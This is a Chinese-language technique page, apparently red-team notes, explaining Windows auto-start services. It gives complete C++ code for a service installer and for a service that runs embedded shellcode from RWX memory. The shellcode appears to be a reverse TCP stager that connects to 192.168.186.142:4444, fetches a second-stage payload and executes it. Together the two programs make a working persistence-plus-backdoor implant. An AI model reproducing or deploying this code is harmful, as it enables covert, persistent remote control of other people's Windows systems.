# 自启动服务

通常windows服务运行在session 0，隔断了系统服务和桌面系统，各个session之间相互独立，不能交互和通信。

> 服务控制管理器（SCM：`Services Control Manager`）是一个管理系统所有服务的进程。当 SCM 启动某个服务时，它等待某个进程的主线程来调用 StartServiceCtrlDispatcher 函数。将分派表传递给 StartServiceCtrlDispatcher。这将把调用进程的主线程转换为控制分派器。该分派器启动一个新线程，该线程运行分派表中每个服务的 ServiceMain 函数分派器还监视程序中所有服务的执行情况。然后分派器将控制请求从 SCM 传给服务。

系统进程自启动是通过windows系统提供的api创建系统服务，并设置服务为自启动类型实现的，创建系统服务的时候要求具有管理员权限，作为系统服务启动的程序需要存在一个额外的服务入口点ServiceMain，ServiceMain应首先为服务向控制器注册，ServiceMain运行在一个单独的线程内，这个线程是由控制分派器创建的 ，通常需要把不需要用户交互的操作放在这里面，如果需要与用户交互，可以通过WTS系列函数来实现。

## 创建流程

* 加载器:

1. 获取SCManager句柄
2. 通过SCManager对服务进行增删查改

* 服务执行体

1. 连接到SCM
2. 注册服务控制处理器 
3. 在控制处理器中对服务控制进行处理（通过SetServiceStatus反馈服务状态和设置接受的控制）。



## 大致原理

服务控制管理器进程services.exe会在系统初始化时遍历名为HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Services的注册表项，这个注册表项记录着所有注册的windows服务的实现文件\(系统默认服务通常是一个dll\)、启动权限。

![](../.gitbook/assets/image%20%28188%29.png)

遍历后将所有设置为auto-start的服务启动，通常表现形式为每个服务带起一个名为svchost.exe进程，这个进程是一个共享服务进程，具体服务线程的代码则是该进程额外载入的注册表内记录的dll文件。

![](../.gitbook/assets/image%20%28189%29.png)

## 代码实现

serviceloader.cpp

```text
#include <Windows.h>
#include <Shlwapi.h>
#include <stdio.h>
#pragma comment(lib, "Shlwapi.lib")


// 0 加载服务    1 启动服务    2 停止服务    3 删除服务
BOOL SystemServiceOperate(char* lpszDriverPath, int iOperateType)
{
	BOOL bRet = TRUE;
	char szName[MAX_PATH] = { 0 };

	lstrcpy(szName, lpszDriverPath);
	// 过滤掉文件目录，获取文件名
	PathStripPath(szName);

	SC_HANDLE shSCManager = NULL, shService = NULL;
	SERVICE_STATUS sStatus;
	DWORD dwErrorCode = 0;

	// 打开服务控制管理器数据库
	shSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (0 != iOperateType)
	{
		// 打开一个已经存在的服务
		shService = OpenService(shSCManager, szName, SERVICE_ALL_ACCESS);
		if (!shService)
		{
			CloseServiceHandle(shSCManager);
			shSCManager = NULL;
			return FALSE;
		}
	}

	switch (iOperateType)
	{
	case 0:
	{
		// 创建服务
		// SERVICE_AUTO_START   随系统自动启动
		// SERVICE_DEMAND_START 手动启动
		shService = CreateService(shSCManager, szName, szName,
			SERVICE_ALL_ACCESS,
			SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
			SERVICE_AUTO_START,
			SERVICE_ERROR_NORMAL,
			lpszDriverPath, NULL, NULL, NULL, NULL, NULL);
		break;
	}
	case 1:
	{
		// 启动服务
		StartService(shService, 0, NULL);
		break;
	}
	case 2:
	{
		// 停止服务
		ControlService(shService, SERVICE_CONTROL_STOP, &sStatus);
		break;
	}
	case 3:
	{
		// 删除服务
		DeleteService(shService);
		break;
	}
	default:
		break;
	}
	// 关闭句柄

	CloseServiceHandle(shService);
	CloseServiceHandle(shSCManager);

	return TRUE;
}

int main(int argc, TCHAR* argv[])
{


	BOOL bRet = FALSE;
	char szFileName[MAX_PATH] = "C:\\Users\\Black Sheep\\source\\repos\\SimpleService\\Debug\\TestService.exe";

	bRet = SystemServiceOperate(szFileName, 0);
	if (FALSE == bRet)
	{
		printf("Create Error!\n");
	}
	bRet = SystemServiceOperate(szFileName, 1);
	if (FALSE == bRet)
	{
		printf("Start Error!\n");
	}
	printf("Create and Start OK.\n");

	system("pause");

	// 停止并删除服务
	bRet = SystemServiceOperate(szFileName, 2);
	if (FALSE == bRet)
	{
		printf("Stop Error!\n");
	}
	bRet = SystemServiceOperate(szFileName, 3);
	if (FALSE == bRet)
	{
		printf("Delete Error!\n");
	}
	printf("Stop and Delete OK.\n");

	system("pause");
}

```

服务:

```text
// ServiceTest.cpp : 定义控制台应用程序的入口点。
//
// ServiceTest.cpp : 定义控制台应用程序的入口点。
//

#include <stdio.h>
#include <tchar.h>
#include <Windows.h>
#include <Shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")
unsigned char buf[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54"
"\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\xba\x8e"
"\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0"
"\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8"
"\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00"
"\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
"\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3";
// 服务入口函数以及处理回调函数
void __stdcall ServiceMain(DWORD dwArgc, char* lpszArgv);
void __stdcall ServiceCtrlHandle(DWORD dwOperateCode);
BOOL TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress);
void DoTask();

// 全局变量
char g_szServiceName[MAX_PATH] = "ServiceTest.exe";    // 服务名称 
SERVICE_STATUS_HANDLE g_ServiceStatusHandle = { 0 };
BOOL bOnce = FALSE;

int _tmain(int argc, _TCHAR* argv[])
{
	// 注册服务入口函数
	SERVICE_TABLE_ENTRYA stDispatchTable[] = { {g_szServiceName, (LPSERVICE_MAIN_FUNCTIONA)ServiceMain }, { NULL, NULL } };
	StartServiceCtrlDispatcherA(stDispatchTable);

	return 0;
}


void __stdcall ServiceMain(DWORD dwArgc, char* lpszArgv)
{
	g_ServiceStatusHandle = RegisterServiceCtrlHandlerA(g_szServiceName, ServiceCtrlHandle);

	TellSCM(SERVICE_START_PENDING, 0, 1);
	TellSCM(SERVICE_RUNNING, 0, 0);

	// 自己程序实现部分代码放在这里
	// !!注意!! 此处一定要为死循环, 否则在关机再开机的情况(不是点击重启), 不能创建用户进程
	while (TRUE)
	{
		Sleep(5000);
		DoTask();
	}
}


void __stdcall ServiceCtrlHandle(DWORD dwOperateCode)
{
	switch (dwOperateCode)
	{
	case SERVICE_CONTROL_PAUSE:
	{
		// 暂停
		TellSCM(SERVICE_PAUSE_PENDING, 0, 1);
		TellSCM(SERVICE_PAUSED, 0, 0);
		break;
	}
	case SERVICE_CONTROL_CONTINUE:
	{
		// 继续
		TellSCM(SERVICE_CONTINUE_PENDING, 0, 1);
		TellSCM(SERVICE_RUNNING, 0, 0);
		break;
	}
	case SERVICE_CONTROL_STOP:
	{
		// 停止
		TellSCM(SERVICE_STOP_PENDING, 0, 1);
		TellSCM(SERVICE_STOPPED, 0, 0);
		break;
	}
	case SERVICE_CONTROL_INTERROGATE:
	{
		// 询问
		break;
	}
	default:
		break;
	}
}

BOOL TellSCM(DWORD dwState, DWORD dwExitCode, DWORD dwProgress)
{
	SERVICE_STATUS serviceStatus = { 0 };
	BOOL bRet = FALSE;

	RtlZeroMemory(&serviceStatus, sizeof(serviceStatus));
	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	serviceStatus.dwCurrentState = dwState;
	serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
	serviceStatus.dwWin32ExitCode = dwExitCode;
	serviceStatus.dwWaitHint = 3000;

	bRet = SetServiceStatus(g_ServiceStatusHandle, &serviceStatus);
	return bRet;
}

void DoTask()
{

	if (bOnce == FALSE)
	{
		bOnce = TRUE;
		LPVOID Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		memcpy(Memory, buf, sizeof(buf));
		((void(*)())Memory)();
	}
}
```

github:[https://github.com/idiotc4t/SimpleService.git](https://github.com/idiotc4t/SimpleService.git)

![](../.gitbook/assets/image%20%2825%29.png)

## LINKS

{% embed url="https://www.cnblogs.com/lgxZJ/p/7440116.html" %}



{% embed url="https://docs.microsoft.com/en-us/windows/win32/ad/installing-a-service-on-a-host-computer" %}

{% embed url="https://payloads.online/archivers/2020-04-02/1\#0x05-%E7%BC%96%E5%86%99%E6%9C%8D%E5%8A%A1%E7%A8%8B%E5%BA%8F" %}

{% embed url="https://www.cnblogs.com/hbccdf/p/3491641.html" %}

{% embed url="https://medium.com/@nasbench/demystifying-the-svchost-exe-process-and-its-command-line-options-508e9114e747" %}



